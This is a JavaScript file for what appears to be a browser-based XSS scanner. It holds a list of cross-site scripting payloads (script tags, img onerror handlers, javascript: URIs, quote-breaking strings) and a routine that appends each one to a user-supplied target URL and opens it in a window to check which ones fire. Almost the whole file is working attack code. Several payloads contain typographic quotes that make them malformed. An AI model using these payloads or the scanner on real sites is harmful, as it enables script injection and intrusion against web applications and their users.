var targetActive=null;
var payload=[
	"<script>{EXEC}</script>",
	"<script>{EXEC}</script>",
	"\"><img src='x' onerror=\"{EXEC}\"/>",
	"\"><img src='x' onerror=\"{EXEC}\"/>",
	"<script>{EXEC}</script>",
	"<ScRipT>{EXEC}</ScRipT>",
	"<script>{EXEC}</script>",
	"<script>{EXEC};alert(\"hellox worldss\");</script>",
	"<script>{EXEC}</script>",
	"<script>{EXEC}alert(“XSS”);</script>",
	"<script>{EXEC}alert(‘XSS’)</script>",
	"“><script>{EXEC}alert(“XSS”)</script>",
	"<script>{EXEC}alert(/XSS”)</script>",
	"<script>{EXEC}alert(/XSS/)</script>",
	"</script><script>{EXEC}alert(1)</script>",
	"‘; {EXEC}alert(1);",
	"‘){EXEC}alert(1);//",
	"<ScRiPt>{EXEC}alert(1)</sCriPt>",
	"<IMG SRC=jAVasCrIPt:{EXEC}alert(‘XSS’)>",
	"<IMG SRC=”javascript:{EXEC}alert(‘XSS’);”>",
	"<IMG SRC=javascript:{EXEC}alert(&quot;XSS&quot;)>",
	"<IMG SRC=javascript:{EXEC}alert(‘XSS’)>",
	"<img src=xss onerror={EXEC}alert(1)>",
];
var l=payload.length;
var i=0;
function testAlert(url){
	rep=setInterval(runAlertXSS,1500);
	targetActive=window.open(url,'_blank');
	if(targetActive==null){
		return true;
	}
	return false;
}
var res="";
function runAlertXSS(){
	clearInterval(rep);
	rep=setInterval(runAlertXSS,1500);
	target=document.getElementById("target").value;
	if(!(targetActive==null)){
		var exec="localStorage.payload"+i+"+='Ok';alert("+i+");";
		payload[i]=payload[i].replace("{EXEC}",exec);
		testURI=target+payload[i];
		res+=("\n[+]Payload["+i+"]: "+payload[i]).trim();
		res+="\n\n################################\n\n";
		document.getElementById("res").innerHTML+=res;
		targetActive.location.href=testURI;
	}
	if(payload[i]===undefined){
		clearInterval(rep);
	}
	i++;
}
